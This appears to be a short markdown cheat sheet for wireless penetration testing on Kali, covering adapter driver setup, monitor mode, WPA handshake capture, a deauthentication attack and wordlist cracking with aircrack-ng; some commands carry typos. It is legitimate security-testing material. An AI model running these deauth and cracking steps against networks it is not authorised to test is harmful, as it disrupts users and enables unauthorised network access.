# Wireless Penetration Testing

## Installing Drivers AWUS036ACH on Kali 2022.2

```
sudu su
apt-get update
apt-get upgrade
apt-get dist-upgrade
reboot
apt-get install realtek-rtl88xxau-dkms
apt-get install dkms
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au/
make
make install
```

## Check if adapter is on
```
airmon-ng
```

## Check other services
```
airmon-ng check
```

## Check kill services (could interfere with monitor mode)
```
airmon-ng check kill
```

## Check if adapter is available
```
iwconfig
```

## Start airmon-ng <interface>
```
airmon-ng start wlan0
iwconfig

At this point, should see our wlan0 card in monitor mode (wlan0mon)
```

## See what Access Points are running
```
airodump-ng wlan0
Ctrl + C to stop
```

## Capture Handshake
- **(NOTE: This is for testing purposes only, do NOT capture for wireless networks that you don't own)**

```
airodump --bssid <mac address of ap> --channel <id> wlan0 --output-format pcap --write <name of pcap>
```

## Deauthentication Attack
- **(NOTE: This is for testing purposes only, do NOT capture for wireless networks that you don't own)**
```
aireplay-ng -0 1 -a <mac addredss of ap> -c <mac address of client> wlan0
```

## Stop airomon-ng <interface>
```
airmon-ng stop wlan0
```

## Audit password strength of captured network hash
- **(NOTE: This is for testing purposes only, do NOT capture for wireless networks that you don't own)**
```
aircrack-ng <name of pcap> -w /usr/share/wordlists/rockyou.txt
```